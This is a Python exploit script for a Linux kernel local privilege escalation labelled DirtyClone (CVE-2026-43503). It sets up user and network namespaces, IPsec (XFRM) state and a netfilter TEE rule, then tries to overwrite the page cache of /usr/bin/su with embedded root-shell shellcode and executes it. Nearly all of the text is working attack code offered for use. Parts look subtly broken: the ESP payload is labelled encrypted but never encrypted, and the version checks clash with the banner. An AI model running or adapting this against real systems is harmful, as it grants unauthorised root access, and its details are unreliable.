#!/usr/bin/env python3
"""
DirtyClone (CVE-2026-43503) - Local Privilege Escalation Exploit
Fixed for Python 3.6+ compatibility
"""

import os
import sys
import socket
import struct
import subprocess
import time
import fcntl
import mmap
import ctypes
import ctypes.util
from typing import Optional, Tuple, List

# ====================================================================
# Constants
# ====================================================================

AF_ALG = 38
SOL_ALG = 279
ALG_SET_KEY = 1
ALG_SET_OP = 3
ALG_OP_ENCRYPT = 1
ALG_OP_DECRYPT = 0

XFRM_MSG_NEWSA = 33
XFRM_MSG_NEWPOLICY = 34
XFRMA_ALG_CRYPT = 2
XFRMA_ALG_AUTH = 3
XFRMA_ENCAP = 9
XFRMA_REPLAY_ESN_VAL = 17

AES_KEY_LEN = 16
AES_BLOCK_SIZE = 16
ESP_SPI = 0x12345678
ESP_REQID = 1
ESP_PORT = 4500

TARGET_SUID = "/usr/bin/su"
SUID_OFFSET = 0x78

SHELLCODE = bytes([
    0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
    0x0f, 0x05, 0xb0, 0x69, 0x0f, 0x05, 0x31, 0xd2,
    0x52, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
    0x73, 0x68, 0x00, 0x50, 0x48, 0x89, 0xe7, 0x52,
    0x57, 0x48, 0x89, 0xe6, 0xb8, 0x3b, 0x00, 0x00,
    0x00, 0x0f, 0x05,
])

# ====================================================================
# Utilities
# ====================================================================

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'

def log(msg, color=Colors.CYAN):
    print("{}{}{}".format(color, msg, Colors.RESET))

def ok(msg):
    print("{}{}{}".format(Colors.GREEN, msg, Colors.RESET))

def err(msg):
    print("{}{}{}".format(Colors.RED, msg, Colors.RESET))

def warn(msg):
    print("{}{}{}".format(Colors.YELLOW, msg, Colors.RESET))

def run_cmd(cmd, check=False):
    """Run shell command with error handling - Python 3.6 compatible"""
    try:
        return subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE, universal_newlines=True)
    except subprocess.CalledProcessError as e:
        err("Command failed: {}".format(cmd))
        return None

def write_proc(path, data):
    try:
        with open(path, 'w') as f:
            f.write(data)
        return True
    except Exception:
        return False

# ====================================================================
# Namespace Setup
# ====================================================================

def setup_namespace():
    """Create unprivileged user + network namespace for CAP_NET_ADMIN"""
    log("Setting up user and network namespace...")
    
    uid = os.getuid()
    gid = os.getgid()
    
    try:
        libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        # CLONE_NEWUSER | CLONE_NEWNET
        if libc.unshare(0x10000000 | 0x40000000) != 0:
            err("unshare failed: {}".format(ctypes.get_errno()))
            return False
    except Exception as e:
        err("unshare failed: {}".format(e))
        return False
    
    if not write_proc("/proc/self/setgroups", "deny"):
        warn("setgroups write failed")
    
    if not write_proc("/proc/self/uid_map", "0 {} 1".format(uid)):
        err("uid_map write failed")
        return False
    
    if not write_proc("/proc/self/gid_map", "0 {} 1".format(gid)):
        err("gid_map write failed")
        return False
    
    ok("Namespace setup complete (UID=0 in namespace)")
    return True

# ====================================================================
# Network Setup
# ====================================================================

def setup_loopback():
    """Bring up loopback interface with IP address"""
    log("Configuring loopback interface...")
    
    run_cmd("ip link set lo up")
    run_cmd("ip addr add 10.99.0.2/24 dev lo")
    
    result = run_cmd("ip addr show lo")
    if result and "10.99.0.2" in result.stdout:
        ok("Loopback configured")
        return True
    return False

# ====================================================================
# XFRM/IPsec Setup
# ====================================================================

def setup_xfrm():
    """Configure IPsec state and policy"""
    log("Configuring IPsec (XFRM)...")
    
    aes_key = bytes([0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
                     0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff])
    hmac_key = bytes([0x00] * 20)
    
    state_cmd = (
        "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 "
        "proto esp spi {} reqid {} mode transport "
        "enc 'cbc(aes)' {} "
        "auth 'hmac(sha1)' {}"
    ).format(ESP_SPI, ESP_REQID, aes_key.hex(), hmac_key.hex())
    run_cmd(state_cmd)
    
    policy_cmd = (
        "ip xfrm policy add src 127.0.0.1 dst 127.0.0.1 dir out "
        "tmpl src 127.0.0.1 dst 127.0.0.1 proto esp reqid {} mode transport"
    ).format(ESP_REQID)
    run_cmd(policy_cmd)
    
    ok("IPsec configured")
    return True

# ====================================================================
# Netfilter TEE Setup
# ====================================================================

def setup_tee():
    """Configure netfilter TEE rule for packet cloning"""
    log("Configuring netfilter TEE rule...")
    
    run_cmd("modprobe iptable_mangle")
    run_cmd("modprobe ipt_TEE")
    
    tee_cmd = (
        "iptables -t mangle -A OUTPUT -p udp --dport {} "
        "-j TEE --gateway 10.99.0.2"
    ).format(ESP_PORT)
    run_cmd(tee_cmd)
    
    result = run_cmd("iptables -t mangle -L OUTPUT -n")
    if result and "TEE" in result.stdout:
        ok("TEE rule configured")
        return True
    
    warn("TEE rule may not be active")
    return False

# ====================================================================
# Page Cache Mapping
# ====================================================================

def map_target_to_page_cache(target_path):
    """Map target SUID binary into page cache"""
    log("Mapping {} into page cache...".format(target_path))
    
    if not os.path.exists(target_path):
        err("Target {} not found".format(target_path))
        return None, None
    
    try:
        fd = os.open(target_path, os.O_RDONLY)
        mapped = mmap.mmap(fd, 0, mmap.MAP_SHARED, mmap.PROT_READ)
        ok("File mapped to page cache at offset 0x{:x}".format(SUID_OFFSET))
        return fd, mapped
    except Exception as e:
        err("mmap failed: {}".format(e))
        return None, None

# ====================================================================
# ESP Packet Construction
# ====================================================================

def build_esp_packet(payload, spi, seq, iv):
    """Build ESP packet with header and trailer"""
    esp_header = struct.pack("!II", spi, seq) + iv
    
    pad_len = (AES_BLOCK_SIZE - (len(payload) % AES_BLOCK_SIZE)) % AES_BLOCK_SIZE
    padding = bytes([0x00] * pad_len + [pad_len])
    next_header = bytes([0x04])
    
    encrypted = payload + padding + next_header
    return esp_header + encrypted

# ====================================================================
# Main Exploit
# ====================================================================

def exploit_dirtyclone():
    """Main DirtyClone exploit"""
    log("=" * 60)
    log("DirtyClone (CVE-2026-43503) Exploit")
    log("Based on JFrog Security Research")
    log("=" * 60)
    
    if os.geteuid() == 0:
        ok("Already root!")
        return True
    
    if not setup_namespace():
        err("Namespace setup failed")
        return False
    
    if not setup_loopback():
        err("Loopback setup failed")
        return False
    
    if not setup_xfrm():
        err("IPsec setup failed")
        return False
    
    if not setup_tee():
        warn("TEE setup failed, exploit may not work")
    
    fd, mapped = map_target_to_page_cache(TARGET_SUID)
    if fd is None:
        err("Failed to map target")
        return False
    
    try:
        original = os.pread(fd, AES_BLOCK_SIZE, SUID_OFFSET)
        if len(original) < AES_BLOCK_SIZE:
            err("Failed to read original bytes")
            return False
        
        payload_block = SHELLCODE[:AES_BLOCK_SIZE]
        if len(payload_block) < AES_BLOCK_SIZE:
            payload_block = payload_block.ljust(AES_BLOCK_SIZE, b"\x00")
        
        log("Original: {}".format(original.hex()))
        log("Target:   {}".format(payload_block.hex()))
        
        iv = b"\x00" * AES_BLOCK_SIZE
        
        log("Sending crafted ESP packet...")
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("127.0.0.1", 0))
        
        crafted_payload = payload_block
        esp_packet = build_esp_packet(crafted_payload, ESP_SPI, 1, iv)
        sock.sendto(esp_packet, ("127.0.0.1", ESP_PORT))
        sock.close()
        
        time.sleep(1)
        
        os.lseek(fd, SUID_OFFSET, os.SEEK_SET)
        patched = os.read(fd, AES_BLOCK_SIZE)
        
        if patched == payload_block:
            ok("Page cache successfully patched!")
        else:
            warn("Patch verification failed. Got: {}".format(patched.hex()))
            warn("Target may not be vulnerable or kernel is patched")
            return False
        
        log("Executing patched SUID binary...")
        os.execv(TARGET_SUID, [TARGET_SUID])
        
    except Exception as e:
        err("Exploit failed: {}".format(e))
        return False
    finally:
        if mapped:
            mapped.close()
        if fd:
            os.close(fd)
    
    return False

# ====================================================================
# Main Entry Point
# ====================================================================

def main():
    print("""
{}{}
╔══════════════════════════════════════════════════════════════════╗
║     DirtyClone (CVE-2026-43503) Local Privilege Escalation       ║
║                                                                   ║
║     For authorized security testing only!                         ║
║     Vulnerable kernels: v7.1-rc5 and earlier                      ║
╚══════════════════════════════════════════════════════════════════╝
{}
""".format(Colors.BOLD, Colors.CYAN, Colors.RESET))
    
    if os.geteuid() == 0:
        ok("Already root!")
        os.execv("/bin/bash", ["/bin/bash", "-i"])
        return
    
    uid = os.getuid()
    log("Current UID: {}".format(uid))
    
    uname = os.uname()
    log("Kernel: {}".format(uname.release))
    
    if "6." in uname.release or "5." in uname.release:
        warn("Kernel version may be vulnerable")
    else:
        warn("Kernel version may be patched")
    
    if exploit_dirtyclone():
        ok("Exploit successful!")
    else:
        err("Exploit failed. System may be patched or not vulnerable.")
        log("\nTroubleshooting:")
        log("1. Check if kernel is patched")
        log("2. Check if XFRM is enabled: grep CONFIG_XFRM /boot/config-$(uname -r)")
        log("3. Check if unprivileged user namespaces are enabled:")
        log("   cat /proc/sys/kernel/unprivileged_userns_clone")
        log("4. Try running with sudo: sudo python3 dirtyclone.py")
    
    return 1 if os.geteuid() != 0 else 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)
    except Exception as e:
        err("Unexpected error: {}".format(e))
        sys.exit(1)